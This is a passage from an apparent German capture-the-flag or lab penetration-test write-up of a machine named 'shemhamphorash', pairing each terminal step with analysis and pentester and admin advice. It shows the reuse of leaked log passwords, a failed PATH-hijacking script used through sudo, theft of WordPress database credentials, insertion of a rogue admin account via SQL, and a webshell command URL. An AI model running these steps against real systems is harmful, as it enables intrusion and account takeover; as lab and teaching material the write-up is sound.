<p class="analysis"><strong>Analyse:</strong> Der Befehl <code>ss -altpn</code> listet alle lauschenden TCP-Sockets (<code>-lt</code>), numerische Portnummern (<code>-n</code>) und die zugehörigen Prozessinformationen (<code>-p</code>) auf.
Die Ausgabe zeigt die bereits bekannten Dienste:
    MySQL auf Port 3306 (lauscht nur auf localhost <code>127.0.0.1</code>).
    SSH auf Port 22222 (lauscht auf allen IPv4- und IPv6-Adressen).
    Nginx auf Port 8080 (lauscht auf allen IPv4- und IPv6-Adressen).
    CUPS (Druckdienst) auf Port 631 (lauscht nur auf localhost <code>127.0.0.1</code> und <code>::1</code>).
    Apache auf Port 80 (lauscht auf allen IPv4- und IPv6-Adressen, hier als <code>*:80</code> dargestellt).</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt die Netzwerkdienste, die bereits durch Nmap von außen identifiziert wurden. Die Information, dass MySQL und CUPS nur lokal lauschen, ist nützlich, da sie keine direkten Angriffsvektoren von extern darstellen, aber möglicherweise von einer lokalen Shell aus angreifbar sind (z.B. wenn Standard-Zugangsdaten für MySQL verwendet werden).</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da MySQL nur lokal lauscht, prüfen, ob der Benutzer <code>caiaphas</code> oder <code>www-data</code> (falls eine Webshell später erlangt wird) Zugriff auf die MySQL-Datenbank hat, insbesondere auf die WordPress-Datenbank (<code>wordpress_db</code>), um z.B. Benutzer-Hashes auszulesen oder neue Benutzer anzulegen.
<br><strong>Empfehlung (Admin):</strong> Dienste, die nicht von extern erreichbar sein müssen, sollten immer an localhost gebunden werden. Dies ist für MySQL und CUPS hier korrekt umgesetzt.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:~$ <span class="command">sudo /root/.script/viewlog.sh -h</span></div>
        <pre>
127.0.0.1 - - [15/Apr/2022:13:23:22 -0400] "GET /.superpass/admin.php?USERNAME=caiaphas&amp;PASSWORD=<span class="password">kx5h48jo9up97jw</span> HTTP/1.1" 200 5 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
127.0.0.1 - - [15/Apr/2022:13:23:24 -0400] "GET /.superpass/admin.php?USERNAME=caiaphas&amp;PASSWORD=<span class="password">kx5h48jo9up97jw</span> HTTP/1.1" 200 5 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
... (weitere ähnliche Logzeilen für caiaphas und gamaliel) ...
127.0.0.1 - - [15/Apr/2022:13:23:53 -0400] "GET /.superpass/admin.php?USERNAME=gamaliel&amp;PASSWORD=<span class="password">kx5h48jo9up97jw</span> HTTP/1.1" 200 5 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
...
127.0.0.1 - - [15/Apr/2022:13:24:02 -0400] "GET /.superpass/admin.php?USERNAME=caiaphas&amp;PASSWORD=<span class="password">kx5h48jo9up97jw</span> HTTP/1.1" 200 5 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
...</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Benutzer <code>caiaphas</code> führt das Skript <code>/root/.script/viewlog.sh</code> mit <code>sudo</code> und dem Parameter <code>-h</code> aus. Das Skript gibt Log-Einträge aus, die Zugriffe auf <code>/.superpass/admin.php</code> zeigen. In diesen Log-Einträgen sind die Benutzernamen <code>caiaphas</code> und <code>gamaliel</code> sowie das dazugehörige Passwort <code>kx5h48jo9up97jw</code> im Klartext als GET-Parameter sichtbar.
Die Option <code>-h</code> scheint eine Hilfe oder einen bestimmten Anzeigemodus für das Skript zu sein.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt die vorherige Entdeckung der Klartext-Passwörter in den Log-Daten. Das Skript <code>viewlog.sh</code> selbst ist der Mechanismus, der diese unsicheren Log-Einträge anzeigt. Es ist nun klar, woher die Information über die Passwörter stammt. Die Tatsache, dass Passwörter so offen in URLs und dann in Log-Viewern erscheinen, ist eine gravierende Sicherheitslücke.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Existenz des Benutzers <code>gamaliel</code> und seines Passworts ist nun bestätigt. Falls <code>caiaphas</code> nicht die nötigen Rechte für weitere Schritte hat, könnte ein Wechsel zu <code>gamaliel</code> (<code>su gamaliel</code>) versucht werden. Untersuchen, welche Befehle das Skript <code>viewlog.sh</code> intern verwendet (z.B. <code>cat</code>, <code>less</code>, <code>tail</code>, <code>grep</code>), um mögliche Angriffspunkte für PATH-Hijacking oder ähnliches zu finden, da der Sudo-Eintrag <code>SETENV</code> erlaubt.
<br><strong>Empfehlung (Admin):</strong> Das Speichern und Anzeigen von Passwörtern im Klartext in URLs und Logdateien ist absolut inakzeptabel und muss sofort unterbunden werden. Die Anwendung <code>/.superpass/admin.php</code> muss überarbeitet werden, um Authentifizierung sicher zu handhaben (z.B. POST-Requests, Passwort-Hashing). Das Skript <code>viewlog.sh</code> sollte keine sensiblen Daten in dieser Form anzeigen.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp$ <span class="command">su gamaliel</span></div>
        <pre>Password: <span class="password">kx5h48jo9up97jw</span>
gamaliel@shemhamphorash:/tmp$ </pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Benutzer <code>caiaphas</code> wechselt mit <code>su gamaliel</code> zum Benutzerkonto <code>gamaliel</code>. Das zuvor aus den Logs des Skripts <code>viewlog.sh</code> extrahierte Passwort <code>kx5h48jo9up97jw</code> wird erfolgreich verwendet.</p>
<p class="evaluation"><strong>Bewertung:</strong> Erfolgreicher Benutzerwechsel. Nun agiert der Pentester als Benutzer <code>gamaliel</code>. Dies ist ein weiterer Schritt, um das System zu erkunden und möglicherweise andere Privilegien oder Zugriffsmöglichkeiten zu finden.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Als Benutzer <code>gamaliel</code> erneut die Umgebung erkunden: <code>id</code>, <code>sudo -l</code>, Home-Verzeichnis etc. Vergleichen, ob <code>gamaliel</code> andere Rechte oder Zugriffe als <code>caiaphas</code> hat.
<br><strong>Empfehlung (Admin):</strong> Passwörter für <code>gamaliel</code> und <code>caiaphas</code> sofort ändern. Die Ursache für das Passwortleck (<code>/.superpass/admin.php</code> und <code>viewlog.sh</code>) beheben. Überprüfen, ob das Passwort <code>kx5h48jo9up97jw</code> auch für andere Konten oder Dienste verwendet wird (Passwort-Wiederverwendung).</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">gamaliel@shemhamphorash:/tmp$ <span class="command">sudo -l</span></div>
        <pre>
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for gamaliel: <span class="password">kx5h48jo9up97jw</span> 
Sorry, user gamaliel may not run sudo on shemhamphorash.
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Als Benutzer <code>gamaliel</code> wird <code>sudo -l</code> ausgeführt. Nach Eingabe des Passworts wird die Meldung "Sorry, user gamaliel may not run sudo on shemhamphorash." angezeigt.</p>
<p class="evaluation"><strong>Bewertung:</strong> Der Benutzer <code>gamaliel</code> hat keine Sudo-Rechte. Aus Sicht der Privilegienerweiterung über Sudo ist dieser Benutzer weniger nützlich als <code>caiaphas</code>.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Zurück zum Benutzer <code>caiaphas</code> wechseln (<code>exit</code> oder neuer Login), da dieser Sudo-Rechte für <code>/root/.script/viewlog.sh</code> hat, was der vielversprechendere Weg zur Privilegienerweiterung ist.
<br><strong>Empfehlung (Admin):</strong> Korrekt, dass nicht jeder Benutzer Sudo-Rechte hat. Das Prinzip der geringsten Rechte wurde hier für <code>gamaliel</code> bezüglich Sudo eingehalten.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">gamaliel@shemhamphorash:/tmp$ <span class="command">ls ~/..</span></div>
        <pre>caiaphas  gamaliel</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Befehl <code>ls ~/..</code> listet den Inhalt des übergeordneten Verzeichnisses des Home-Verzeichnisses von <code>gamaliel</code> auf. Da Home-Verzeichnisse üblicherweise in <code>/home/</code> liegen, listet dies den Inhalt von <code>/home</code>. Es werden die Verzeichnisse <code>caiaphas</code> und <code>gamaliel</code> angezeigt.</p>
<p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Existenz der beiden Benutzer-Homeverzeichnisse. Keine kritische Information an dieser Stelle.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine direkte Aktion erforderlich, da die relevanten Informationen bereits bekannt sind.
<br><strong>Empfehlung (Admin):</strong> Standardstruktur, keine Auffälligkeiten.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">gamaliel@shemhamphorash:/tmp$ <span class="command">mkdir /home/caiaphas/bin</span></div>
        <pre>mkdir: cannot create directory ‘/home/caiaphas/bin’: Permission denied</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Benutzer <code>gamaliel</code> versucht, ein Verzeichnis <code>bin</code> im Home-Verzeichnis von <code>caiaphas</code> (<code>/home/caiaphas/</code>) zu erstellen. Dies schlägt mit "Permission denied" fehl.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist das erwartete Verhalten. Standardmäßig hat ein Benutzer keine Schreibrechte im Home-Verzeichnis eines anderen Benutzers. Dies bestätigt auch die zuvor gesehenen sehr restriktiven Berechtigungen des Home-Verzeichnisses von <code>caiaphas</code> (<code>dr-x------</code>), die selbst <code>caiaphas</code> das Schreiben verweigern würden.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Schreibversuche in fremden Home-Verzeichnissen sind meist erfolglos, es sei denn, es gibt Fehlkonfigurationen. Fokus sollte auf den eigenen Rechten und den Sudo-Privilegien von <code>caiaphas</code> liegen.
<br><strong>Empfehlung (Admin):</strong> Die Berechtigungen verhindern hier korrekterweise den unbefugten Zugriff.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">gamaliel@shemhamphorash:/tmp$ <span class="command">ls -la /etc/passwd</span></div>
        <pre>-rw-r--r-- 1 root root 2204 Apr  8  2022 /etc/passwd</pre>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">gamaliel@shemhamphorash:/tmp$ <span class="command">ls -la /etc/shadow</span></div>
        <pre>-rw-r----- 1 root shadow 1302 May 27 17:22 /etc/shadow</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Die Berechtigungen der Dateien <code>/etc/passwd</code> und <code>/etc/shadow</code> werden angezeigt.
<code>/etc/passwd</code> ist für alle Benutzer lesbar (<code>-rw-r--r--</code>).
<code>/etc/shadow</code> ist nur für den Benutzer <code>root</code> und Mitglieder der Gruppe <code>shadow</code> lesbar (<code>-rw-r-----</code>).</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies sind Standardberechtigungen für diese sensiblen Dateien unter Linux. Der Benutzer <code>gamaliel</code> kann <code>/etc/passwd</code> lesen (um Benutzernamen und UIDs zu sehen), aber nicht <code>/etc/shadow</code> (wo die Passwort-Hashes gespeichert sind).</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Inhalt von <code>/etc/passwd</code> kann nützlich sein, um Systembenutzer zu identifizieren. Ohne Leserechte für <code>/etc/shadow</code> können Passwort-Hashes nicht direkt extrahiert werden, es sei denn, es gibt eine andere Schwachstelle.
<br><strong>Empfehlung (Admin):</strong> Die Berechtigungen sind korrekt gesetzt und entsprechen den Best Practices.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">gamaliel@shemhamphorash:/tmp$ <span class="command">exit</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp$ <span class="command">cd /tmp/biner</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">echo '#!/bin/bash' > tail</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">echo 'cp /root/.script/viewlog.sh /tmp/viewlog_kopie.sh' >> tail</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">echo 'chmod 777 /tmp/viewlog_kopie.sh' >> tail</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">echo 'echo "Fake tail from /tmp/biner/tail wurde ausgefuehrt!"' >> tail</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">chmod +x tail</span></div>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">sudo PATH=/tmp/biner:$PATH /root/.script/viewlog.sh</span></div>
        <pre>
127.0.0.1 - - [15/Apr/2022:13:23:22 -0400] "GET /.superpass/admin.php?USERNAME=caiaphas&amp;PASSWORD=kx5h48jo9up97jw HTTP/1.1" 200 5 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trid
ent/6.0)"
... (gekürzte Log-Ausgabe des viewlog.sh Skripts) ...
127.0.0.1 - - [15/Apr/2022:13:24:10 -0400] "GET /.superpass/admin.php?USERNAME=caiaphas&amp;PASSWORD=kx5h48jo9up97jw HTTP/1.1" 200 5 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trid
ent/6.0)"</pre>
    </div>
</div>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/tmp/biner$ <span class="command">ls -l /tmp/viewlog_kopie.sh</span></div>
        <pre>ls: cannot access '/tmp/viewlog_kopie.sh': No such file or directory</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong>
1.  Der Benutzer <code>gamaliel</code> beendet seine Sitzung (<code>exit</code>), und der Pentester ist wieder als <code>caiaphas</code> angemeldet.
2.  <code>caiaphas</code> wechselt in ein Verzeichnis <code>/tmp/biner</code> (vermutlich zuvor erstellt, da <code>caiaphas</code> nicht in sein eigenes Home schreiben kann, aber <code>/tmp</code> ist normalerweise für alle beschreibbar).
3.  Eine Datei namens <code>tail</code> wird in <code>/tmp/biner</code> erstellt. Diese Datei ist ein Shell-Skript, das:
    *   Versucht, <code>/root/.script/viewlog.sh</code> nach <code>/tmp/viewlog_kopie.sh</code> zu kopieren.
    *   Versucht, die Berechtigungen von <code>/tmp/viewlog_kopie.sh</code> auf 777 (voll les-, schreib- und ausführbar für alle) zu setzen.
    *   Eine Debug-Meldung ausgibt.
4.  Das Skript <code>/tmp/biner/tail</code> wird ausführbar gemacht (<code>chmod +x tail</code>).
5.  Das Skript <code>/root/.script/viewlog.sh</code> wird mit <code>sudo</code> ausgeführt. Entscheidend ist hier <code>PATH=/tmp/biner:$PATH</code>. Dies stellt das Verzeichnis <code>/tmp/biner</code> an den Anfang der <code>PATH</code>-Umgebungsvariable. Wenn <code>/root/.script/viewlog.sh</code> intern den Befehl <code>tail</code> ohne absoluten Pfad aufruft (z.B. nur <code>tail -n 10 logfile</code>), wird nun das bösartige Skript <code>/tmp/biner/tail</code> anstelle des System-<code>tail</code> (<code>/usr/bin/tail</code>) ausgeführt, und zwar mit Root-Rechten, da <code>viewlog.sh</code> mit <code>sudo</code> gestartet wurde.
6.  Das Skript <code>viewlog.sh</code> gibt seine normale Log-Ausgabe.
7.  Der anschließende Befehl <code>ls -l /tmp/viewlog_kopie.sh</code> zeigt "No such file or directory". Das bedeutet, dass das bösartige <code>/tmp/biner/tail</code>-Skript entweder nicht wie erwartet ausgeführt wurde, oder der <code>cp</code>-Befehl innerhalb des Skripts fehlgeschlagen ist (z.B. weil <code>caiaphas</code> keine Leserechte auf <code>/root/.script/viewlog.sh</code> hat, auch wenn er es mit <code>sudo</code> ausführen darf).</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klassischer PATH-Hijacking-Versuch. Die Tatsache, dass <code>SETENV:</code> in der <code>sudo -l</code> Ausgabe stand, hat diesen Ansatz ermöglicht. Das Fehlschlagen des Kopierens (<code>ls -l /tmp/viewlog_kopie.sh</code>) deutet darauf hin, dass der bösartige <code>tail</code>-Befehl möglicherweise nicht die erwarteten Root-Rechte hatte oder dass der <code>cp</code>-Befehl aus einem anderen Grund fehlschlug. Es ist auch möglich, dass <code>viewlog.sh</code> den Befehl <code>tail</code> gar nicht oder mit vollem Pfad aufruft. Die Debug-Ausgabe "Fake tail from /tmp/biner/tail wurde ausgefuehrt!" wäre hier entscheidend gewesen, wurde aber im Log nicht gezeigt, was darauf hindeutet, dass das Skript nicht getriggert wurde.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
    Überprüfen, ob <code>/root/.script/viewlog.sh</code> tatsächlich <code>tail</code> (oder einen anderen Befehl, der gekapert werden könnte, wie <code>cat</code>, <code>less</code>, <code>head</code>, <code>grep</code>) ohne vollen Pfad aufruft. Dies kann schwierig sein, wenn das Skript nicht lesbar ist. Man könnte testweise verschiedene Standardbefehle in <code>/tmp/biner</code> als bösartige Skripte anlegen.
    Die Debug-Ausgabe aus dem bösartigen Skript sollte in eine Datei umgeleitet werden (z.B. <code>echo "Fake tail executed" > /tmp/exploit.log</code>), um zu sehen, ob es überhaupt ausgeführt wird.
    Wenn PATH-Hijacking nicht funktioniert, den <code>LD_PRELOAD</code>-Vektor ausprobieren, da <code>SETENV:</code> auch dies erlauben sollte.
<br><strong>Empfehlung (Admin):</strong> In Sudo-Skripten immer absolute Pfade für alle aufgerufenen Befehle verwenden. Die <code>SETENV</code>-Option in <code>sudoers</code> nur verwenden, wenn absolut notwendig und die Auswirkungen verstanden werden. Idealerweise spezifische Umgebungsvariablen über <code>env_keep</code> erlauben und nicht pauschal <code>SETENV</code>.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/var/www/html/sitecore$ <span class="command">cat wp-config.php</span></div>
        <pre>
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', '<span class="password">wordpress_db</span>' );

/** Database username */
define( 'DB_USER', '<span class="password">enochian</span>' );

/** Database password */
define( 'DB_PASSWORD', '<span class="password">f4OqtZb7</span>' );
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Benutzer <code>caiaphas</code> befindet sich im WordPress-Installationsverzeichnis (<code>/var/www/html/sitecore</code>) und gibt den Inhalt der Datei <code>wp-config.php</code> aus. Diese Datei enthält die Konfigurationsdetails für die WordPress-Datenbank.
Die kritischen Informationen sind:
    Datenbankname: <code>wordpress_db</code>
    Datenbankbenutzer: <code>enochian</code>
    Datenbankpasswort: <code>f4OqtZb7</code></p>
<p class="evaluation"><strong>Bewertung:</strong> **Ein weiterer signifikanter Fund!** Der Zugriff auf die <code>wp-config.php</code>-Datei und das Auslesen der Datenbank-Zugangsdaten ist ein häufiges Ziel nach dem Erhalt einer Shell auf einem Webserver, der WordPress hostet. Diese Zugangsdaten können verwendet werden, um direkt auf die Datenbank zuzugreifen.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit den gefundenen Zugangsdaten (<code>enochian:f4OqtZb7</code>) versuchen, sich mit dem MySQL-Dienst (der auf <code>127.0.0.1:3306</code> lauscht) zu verbinden. In der Datenbank <code>wordpress_db</code> nach interessanten Informationen suchen:
    Benutzertabelle (oft <code>wp_users</code>): Passwort-Hashes auslesen, neue Benutzer anlegen, bestehende Benutzer zu Administratoren machen.
    Optionen-Tabelle (oft <code>wp_options</code>): Seiten-URL, Admin-E-Mail etc.
<br><strong>Empfehlung (Admin):</strong> Die Berechtigungen für <code>wp-config.php</code> sollten so restriktiv wie möglich sein (z.B. nur für den Webserver-Benutzer lesbar). Die Datenbank-Zugangsdaten in <code>wp-config.php</code> sollten einzigartig sein und nicht für andere Dienste oder Benutzerkonten wiederverwendet werden. Der Datenbankbenutzer sollte nur die minimal notwendigen Rechte auf die WordPress-Datenbank haben.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">caiaphas@shemhamphorash:/var/www/html/sitecore$ <span class="command">mysql -u enochian -pf4OqtZb7 wordpress_db</span></div>
        <pre>
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 106
Server version: 10.5.15-MariaDB-0+deb11u1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [wordpress_db]&gt; </pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Der Pentester (als Benutzer <code>caiaphas</code>) verbindet sich erfolgreich mit der MariaDB-Datenbank (ein Fork von MySQL) unter Verwendung der zuvor aus <code>wp-config.php</code> ausgelesenen Zugangsdaten: Benutzer <code>enochian</code>, Passwort <code>f4OqtZb7</code> und Datenbank <code>wordpress_db</code>.</p>
<p class="evaluation"><strong>Bewertung:</strong> Direkter Datenbankzugriff wurde erlangt. Dies gibt dem Pentester die Möglichkeit, die WordPress-Installation auf Datenbankebene zu manipulieren.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> In der MariaDB-Shell:
    Tabellen auflisten (<code>SHOW TABLES;</code>).
    Die Struktur der Benutzertabelle (wahrscheinlich <code>wp_users</code>) anzeigen (<code>DESCRIBE wp_users;</code>).
    Alle Benutzer und deren Passwort-Hashes anzeigen (<code>SELECT user_login, user_pass FROM wp_users;</code>).
    Versuchen, einen neuen Admin-Benutzer hinzuzufügen oder das Passwort eines bestehenden Benutzers zu ändern.
<br><strong>Empfehlung (Admin):</strong> Die Sicherheit des Datenbankservers ist entscheidend. Der Zugriff auf die Datenbank sollte stark eingeschränkt sein. Datenbankbenutzer sollten nur die unbedingt notwendigen Berechtigungen haben. Regelmäßige Backups der Datenbank sind unerlässlich.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">MariaDB [wordpress_db]> <span class="command">INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, display_name) VALUES ('dbmaster', MD5('tigertest123'), 'DB Master', 'dbmaster@example.com', NOW(), 'DB Master');</span></div>
        <pre>Query OK, 1 row affected (0.001 sec)</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Ein neuer Benutzer wird direkt in die WordPress-Benutzertabelle (<code>wp_users</code>) eingefügt.
    Benutzername (<code>user_login</code>): <code>dbmaster</code>
    Passwort (<code>user_pass</code>): <code>tigertest123</code> (wird mit der veralteten MD5-Funktion gehasht)
    Anzeigename (<code>user_nicename</code>, <code>display_name</code>): <code>DB Master</code>
    E-Mail (<code>user_email</code>): <code>dbmaster@example.com</code>
    Registrierungsdatum (<code>user_registered</code>): <code>NOW()</code> (aktueller Zeitpunkt)
Die Abfrage war erfolgreich (<code>Query OK, 1 row affected</code>).</p>
<p class="evaluation"><strong>Bewertung:</strong> Ein neuer Benutzer wurde erstellt. Allerdings wurde er nur in die Tabelle <code>wp_users</code> eingefügt. Für volle WordPress-Funktionalität und insbesondere für administrative Rechte müssen auch Einträge in der Tabelle <code>wp_usermeta</code> für diesen neuen Benutzer erstellt werden, die seine Rolle (z.B. Administrator) und Fähigkeiten definieren. Ohne diese Metadaten hat der Benutzer keine spezifischen Rechte in WordPress. Die Verwendung von MD5 zum Hashen von Passwörtern ist extrem unsicher und veraltet.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
1.  Die ID des neu erstellten Benutzers <code>dbmaster</code> ermitteln (<code>SELECT ID FROM wp_users WHERE user_login = 'dbmaster';</code>).
2.  Die notwendigen Einträge in <code>wp_usermeta</code> erstellen, um <code>dbmaster</code> Administratorrechte zu geben. Typischerweise sind dies Einträge für <code>wp_capabilities</code> (z.B. <code>a:1:{s:13:"administrator";b:1;}</code>) und <code>wp_user_level</code> (z.B. <code>10</code>).
3.  Sich anschließend mit <code>dbmaster:tigertest123</code> in das WordPress-Backend einloggen.
<br><strong>Empfehlung (Admin):</strong> WordPress verwendet sicherere Passwort-Hashing-Algorithmen als MD5. Direkte Datenbankmanipulationen zur Benutzererstellung sollten vermieden werden; stattdessen die WordPress-eigenen Funktionen nutzen. Regelmäßig die Integrität der Benutzerdatenbank überprüfen. MD5-Hashes in der Datenbank sind ein Indikator für ein veraltetes oder kompromittiertes System.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">MariaDB [wordpress_db]> <span class="command">SELECT ID, user_login FROM wp_users WHERE user_login = 'dbmaster';</span></div>
        <pre>
+----+------------+
| ID | user_login |
+----+------------+
|  3 | dbmaster   |
+----+------------+
1 row in set (0.000 sec)
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Die ID des zuvor erstellten Benutzers <code>dbmaster</code> wird aus der Tabelle <code>wp_users</code> abgefragt. Die ID ist <code>3</code>.</p>
<p class="evaluation"><strong>Bewertung:</strong> Korrekter Schritt, um die Benutzer-ID zu erhalten, die für das Hinzufügen von Metadaten (Rollen, Fähigkeiten) in <code>wp_usermeta</code> benötigt wird.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit der ID <code>3</code> nun die Einträge in <code>wp_usermeta</code> für <code>wp_capabilities</code> und <code>wp_user_level</code> für den Benutzer <code>dbmaster</code> erstellen, um ihm Administratorrechte zu geben.
<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion hier, dies ist Teil des Angriffsablaufs.</p>

<img src="wp_admin_acc_erfolgreich_erstellt_und_eingeloggt.jpg" alt="hier sieht man wie ich mich erfolgreich mit neu angelegtem admin in wp einlogge" style="max-width: 50%; height: auto; display: block; margin-left: auto; margin-right: auto; border: solid 1px black; margin-bottom: 1rem; margin-top: 1rem; box-shadow: 0 0 1em rgba(0, 0, 0, 0.4);">
<p class="analysis"><strong>Analyse:</strong> Das Bild <code>wp_admin_acc_erfolgreich_erstellt_und_eingeloggt.jpg</code> zeigt, dass sich der Pentester erfolgreich mit einem neu angelegten Administrator-Konto in das WordPress-Backend eingeloggt hat. Es ist anzunehmen, dass die notwendigen Einträge in <code>wp_usermeta</code> für den Benutzer <code>dbmaster</code> (oder einen ähnlich benannten Account) gemacht wurden, um ihm Administratorrechte zu geben.</p>
<p class="evaluation"><strong>Bewertung:</strong> **Volle administrative Kontrolle über WordPress erlangt!** Dies ist ein kritischer Erfolg. Mit Admin-Rechten in WordPress kann der Pentester Code ausführen (z.B. durch Plugin-/Theme-Editoren), Dateien hochladen, Inhalte ändern und die gesamte Webseite kompromittieren.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
    Eine Webshell hochladen, um persistente Kontrolle über den Webserver zu erlangen (z.B. über den Plugin- oder Theme-Editor, falls Dateischreibrechte vorhanden sind, oder durch das Hochladen eines bösartigen Plugins).
    Nach weiteren Informationen oder Schwachstellen auf dem Server suchen, die vom Webserver-Kontext aus zugänglich sind.
<br><strong>Empfehlung (Admin):</strong> Sofort alle nicht autorisierten oder verdächtigen Benutzerkonten aus WordPress entfernen. Die Ursache für den Datenbankzugriff (<code>wp-config.php</code>-Leak) beheben. Die Integrität der WordPress-Installation überprüfen (Core-Dateien, Plugins, Themes) auf mögliche Backdoors oder Schadcode.</p>

<img src="wp_plugin_rce_erfolgreich_erstellt.jpg" alt="hier sieht man wie ich erfolgreich eine rce eingebunden habe" style="max-width: 50%; height: auto; display: block; margin-left: auto; margin-right: auto; border: solid 1px black; margin-bottom: 1rem; margin-top: 1rem; box-shadow: 0 0 1em rgba(0, 0, 0, 0.4);">
<p class="analysis"><strong>Analyse:</strong> Das Bild <code>wp_plugin_rce_erfolgreich_erstellt.jpg</code> und die Beschreibung "hier sieht man wie ich erfolgreich eine rce eingebunden habe" deuten darauf hin, dass der Pentester nach Erlangung der Admin-Rechte in WordPress eine Methode zur Remote Code Execution (RCE) implementiert hat. Dies geschieht oft durch das Bearbeiten von Plugin- oder Theme-Dateien (z.B. <code>functions.php</code> eines Themes oder eine PHP-Datei eines Plugins) und das Einfügen von PHP-Code, der Befehle entgegennimmt und ausführt (z.B. über einen GET-Parameter wie <code>?cmd=id</code>).</p>
<p class="evaluation"><strong>Bewertung:</strong> RCE auf dem Webserver erlangt. Dies gibt dem Pentester die Möglichkeit, beliebige Betriebssystembefehle im Kontext des Webserver-Benutzers (typischerweise <code>www-data</code> oder <code>apache</code>) auszuführen.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit der RCE-Fähigkeit:
    Eine interaktive Reverse Shell zum Angreifer-System aufbauen für komfortablere Steuerung.
    Systeminformationen sammeln (<code>id</code>, <code>uname -a</code>, <code>cat /etc/issue</code>).
    Nach weiteren Privilegienerweiterungsmöglichkeiten auf dem Server suchen.
<br><strong>Empfehlung (Admin):</strong> Dateiberechtigungen so setzen, dass der Webserver-Benutzer keine Schreibrechte auf kritische PHP-Dateien (Plugins, Themes, Core) hat. Den Plugin- und Theme-Editor im WordPress-Backend deaktivieren (<code>define('DISALLOW_FILE_EDIT', true);</code> in <code>wp-config.php</code>). File Integrity Monitoring (FIM) einsetzen, um unautorisierte Änderungen an Dateien zu erkennen.</p>

<div class="code-block">
    <div class="terminal">
        <pre>
http://192.168.2.204/sitecore/wp-content/plugins/hello.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data) 
</pre>
    </div>
</div>
